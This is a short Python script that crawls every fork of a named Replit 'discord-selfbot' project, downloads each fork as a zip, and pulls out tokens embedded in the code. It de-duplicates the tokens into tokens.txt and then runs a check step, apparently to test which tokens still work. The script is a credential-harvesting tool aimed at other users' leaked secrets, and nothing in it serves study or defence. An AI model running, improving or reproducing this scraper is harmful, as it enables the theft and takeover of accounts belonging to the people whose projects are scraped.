import os
from resources import Design
import asyncio
from resources import ReplIt
from aioconsole import aprint
from colorama import Fore as color




async def main(url: str):
    if os.path.isfile("./false_tokens.txt"):
        os.remove("./false_tokens.txt")

    if os.path.isfile("./tokens.txt"):
        os.remove("./tokens.txt")

    repl = ReplIt()
    await Design.ascii()
    await aprint(f"{color.GREEN}Scraping {url}...{color.RESET}")
    id = await repl.get_id(url)
    urls, ids = await repl.get_forks(id)
    await aprint(f"{color.GREEN}Forks found: {len(urls)}{color.RESET}")
    full = []

    for url, id in zip(urls, ids):
        with open("./false_tokens.txt", "a+") as f:
            try:
                await repl.get_zip(url, id)
                tokens = await repl.search_zip(id)
                for token in tokens:
                    f.write(f"{token}\n")
                full += tokens
            except:
                continue


    for token in full:
        await aprint(f"{color.GREEN}Found token: {token}{color.RESET}")
    await aprint(f"{color.YELLOW}Removing duplicates... {color.RESET}")
    lines_seen = set()
    outfile = open("tokens.txt", "w")
    for line in open("false_tokens.txt", "r"):
        if line not in lines_seen:
            outfile.write(line)
            lines_seen.add(line)
    outfile.close()
    await repl.check()








if __name__ == "__main__":
    asyncio.run(main("/@Ace1028/discord-selfbot"))